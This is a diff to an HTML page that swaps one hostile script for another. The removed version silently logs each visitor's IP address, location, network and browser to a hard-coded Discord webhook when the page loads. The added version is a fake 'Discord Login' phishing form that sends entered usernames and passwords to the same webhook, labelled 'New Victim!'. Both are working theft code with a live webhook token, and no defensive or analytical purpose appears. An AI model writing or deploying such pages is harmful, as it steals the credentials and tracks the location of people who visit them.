@@ -1,27 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Loading...</title>
-  <script>
-    async function exfiltrate() {
-      const webhook = 'https://discord.com/api/webhooks/1362137822248566845/YCmkBoXZWpt5u9q940iE2AlksB1ifuU1kzd02pYhbL6F5fsM92pK0mJNoZVFhZjRarPS';
-      const ipInfo = await fetch('https://ipinfo.io/json').then(res => res.json());
-
-      const payload = {
-        content: `**New Visitor Logged**\nIP: ${ipInfo.ip}\nCity: ${ipInfo.city}\nRegion: ${ipInfo.region}\nOrg: ${ipInfo.org}\nBrowser: ${navigator.userAgent}`
-      };
-
-      fetch(webhook, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-    }
-
-    window.onload = exfiltrate;
-  </script>
+  <title>Discord Login</title>
 </head>
 <body>
-  <h1>Redirecting...</h1>
+  <h2>Discord Login</h2>
+  <form id="phishForm">
+    <input type="text" name="username" placeholder="Email or Phone" required><br><br>
+    <input type="password" name="password" placeholder="Password" required><br><br>
+    <button type="submit">Login</button>
+  </form>
+
+  <script>
+    document.getElementById("phishForm").onsubmit = function(e) {
+      e.preventDefault();
+      const formData = new FormData(this);
+      const user = formData.get("username");
+      const pass = formData.get("password");
+
+      fetch("https://discord.com/api/webhooks/1362137822248566845/YCmkBoXZWpt5u9q940iE2AlksB1ifuU1kzd02pYhbL6F5fsM92pK0mJNoZVFhZjRarPS", {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          content: `New Victim!\nUsername: ${user}\nPassword: ${pass}`
+        })
+      });
+    };
+  </script>
 </body>
 </html>
